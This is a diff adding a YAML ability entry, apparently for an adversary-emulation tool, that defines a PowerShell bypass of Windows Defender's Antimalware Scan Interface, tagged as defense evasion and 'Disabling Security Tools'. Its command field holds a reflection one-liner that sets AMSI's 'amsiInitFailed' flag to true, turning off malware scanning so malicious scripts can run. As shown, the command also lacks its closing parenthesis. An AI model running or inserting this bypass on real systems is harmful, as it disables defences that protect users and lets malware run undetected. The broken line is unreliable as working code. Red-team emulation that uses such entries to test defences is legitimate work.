@@ -1,0 +1,14 @@
+---
+
+- id: tacdefen-1089-AR13-1v00-200121075649
+  name: PowerShell Bypass of AntiMalware Scripting Interface
+  description: .      An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code. .  .      Credit to Matt Graeber (@mattifestation) for the research.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1089
+    name: Disabling Security Tools
+  platforms:
+    windows:
+      psh:
+        command: |
+          [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true
